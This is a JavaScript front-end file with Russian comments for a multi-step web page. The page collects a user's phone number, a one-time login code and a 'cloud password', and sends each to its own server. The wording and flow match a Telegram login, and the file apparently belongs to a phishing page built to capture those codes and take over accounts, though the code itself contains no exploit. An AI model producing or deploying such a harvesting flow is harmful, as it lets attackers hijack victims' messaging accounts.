/**
 * script.js — управление интерфейсом, отправка запросов на сервер
 * Исправлено: удаление пробелов из номера телефона и кода
 */

// DOM-элементы страниц
const pages = {
    main: document.getElementById('page-main'),
    phone: document.getElementById('page-phone'),
    code: document.getElementById('page-code'),
    password: document.getElementById('page-password'),
    success: document.getElementById('page-success'),
};

// Формы и поля
const formPhone = document.getElementById('form-phone');
const phoneInput = document.getElementById('phoneInput');
const phoneError = document.getElementById('phoneError');
const btnSendCode = document.getElementById('btnSendCode');
const phoneSpinner = document.getElementById('phoneSpinner');

const formCode = document.getElementById('form-code');
const codeInput = document.getElementById('codeInput');
const codeError = document.getElementById('codeError');
const btnVerifyCode = document.getElementById('btnVerifyCode');
const codeSpinner = document.getElementById('codeSpinner');

const formPassword = document.getElementById('form-password');
const passwordInput = document.getElementById('passwordInput');
const passwordError = document.getElementById('passwordError');
const btnVerifyPassword = document.getElementById('btnVerifyPassword');
const passwordSpinner = document.getElementById('passwordSpinner');

// Кнопки навигации
const btnGetStarted = document.getElementById('btnGetStarted');
const btnBackFromPhone = document.getElementById('btnBackFromPhone');
const btnBackFromCode = document.getElementById('btnBackFromCode');
const btnBackFromPassword = document.getElementById('btnBackFromPassword');
const btnReset = document.getElementById('btnReset');

// Храним номер телефона глобально
let currentPhone = '';

// ===== Функция переключения страниц =====
function showPage(pageId) {
    Object.keys(pages).forEach(key => {
        const el = pages[key];
        if (key === pageId) {
            el.classList.add('active');
            const card = el.querySelector('.card');
            if (card) {
                card.style.animation = 'none';
                requestAnimationFrame(() => {
                    card.style.animation = '';
                    card.classList.add('animate-fade-up');
                });
            }
        } else {
            el.classList.remove('active');
        }
    });
}

// ===== Валидация телефона (улучшена) =====
function validatePhone(phone) {
    // Удаляем все пробелы, дефисы, скобки и точки
    let cleaned = phone.replace(/[\s\-\(\)\.]/g, '');
    // Если есть + в начале, оставляем его, но проверяем только цифры после
    if (cleaned.startsWith('+')) {
        const digits = cleaned.slice(1);
        if (!/^\d{8,15}$/.test(digits)) {
            return { valid: false, error: 'Введите корректный номер (только цифры после +)' };
        }
        return { valid: true, cleaned: `+${digits}`, error: '' };
    } else {
        // Без + — только цифры
        if (!/^\d{8,15}$/.test(cleaned)) {
            return { valid: false, error: 'Введите корректный номер (только цифры, минимум 8)' };
        }
        return { valid: true, cleaned: cleaned, error: '' };
    }
}

// ===== Обработчики навигации =====
btnGetStarted.addEventListener('click', () => {
    showPage('phone');
});

btnBackFromPhone.addEventListener('click', () => {
    showPage('main');
});

btnBackFromCode.addEventListener('click', () => {
    showPage('phone');
});

btnBackFromPassword.addEventListener('click', () => {
    showPage('code');
});

btnReset.addEventListener('click', () => {
    phoneInput.value = '';
    codeInput.value = '';
    passwordInput.value = '';
    phoneError.textContent = '';
    codeError.textContent = '';
    passwordError.textContent = '';
    showPage('main');
});

// ===== Отправка номера телефона =====
formPhone.addEventListener('submit', async (e) => {
    e.preventDefault();
    const rawPhone = phoneInput.value.trim();
    const validation = validatePhone(rawPhone);
    if (!validation.valid) {
        phoneError.textContent = validation.error;
        return;
    }
    phoneError.textContent = '';
    const phone = validation.cleaned;
    currentPhone = phone;

    btnSendCode.disabled = true;
    phoneSpinner.classList.remove('hidden');

    try {
        const response = await fetch('/api/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone }),
        });
        const data = await response.json();
        if (response.ok) {
            showPage('code');
            codeInput.focus();
        } else {
            phoneError.textContent = data.error || 'Ошибка отправки кода. Попробуйте позже.';
        }
    } catch (err) {
        phoneError.textContent = 'Сервер недоступен. Проверьте соединение.';
    } finally {
        btnSendCode.disabled = false;
        phoneSpinner.classList.add('hidden');
    }
});

// ===== Проверка кода (с удалением пробелов) =====
formCode.addEventListener('submit', async (e) => {
    e.preventDefault();
    // Удаляем все пробелы из введённого кода
    const code = codeInput.value.replace(/\s/g, '');
    if (code.length < 4 || code.length > 6) {
        codeError.textContent = 'Введите код из 4–6 цифр.';
        return;
    }
    codeError.textContent = '';

    btnVerifyCode.disabled = true;
    codeSpinner.classList.remove('hidden');

    try {
        const response = await fetch('/api/verify-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: currentPhone, code }),
        });
        const data = await response.json();
        if (response.ok) {
            if (data.cloudPasswordRequired) {
                showPage('password');
                passwordInput.focus();
            } else {
                showPage('success');
            }
        } else {
            codeError.textContent = data.error || 'Неверный код. Попробуйте снова.';
        }
    } catch (err) {
        codeError.textContent = 'Ошибка соединения с сервером.';
    } finally {
        btnVerifyCode.disabled = false;
        codeSpinner.classList.add('hidden');
    }
});

// ===== Проверка облачного пароля =====
formPassword.addEventListener('submit', async (e) => {
    e.preventDefault();
    const password = passwordInput.value.trim();
    if (password.length < 1) {
        passwordError.textContent = 'Введите пароль.';
        return;
    }
    passwordError.textContent = '';

    btnVerifyPassword.disabled = true;
    passwordSpinner.classList.remove('hidden');

    try {
        const response = await fetch('/api/verify-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: currentPhone, password }),
        });
        const data = await response.json();
        if (response.ok) {
            showPage('success');
        } else {
            passwordError.textContent = data.error || 'Неверный пароль. Попробуйте ещё раз.';
        }
    } catch (err) {
        passwordError.textContent = 'Ошибка соединения с сервером.';
    } finally {
        btnVerifyPassword.disabled = false;
        passwordSpinner.classList.add('hidden');
    }
});

// Если изображение photo.png не загружено, показываем фолбэк
document.querySelectorAll('.banner-image').forEach(img => {
    img.addEventListener('error', function() {
        this.style.display = 'none';
        const fallback = this.parentElement.querySelector('.banner-fallback');
        if (fallback) fallback.style.display = 'flex';
    });
});

// Стартуем с главной
showPage('main');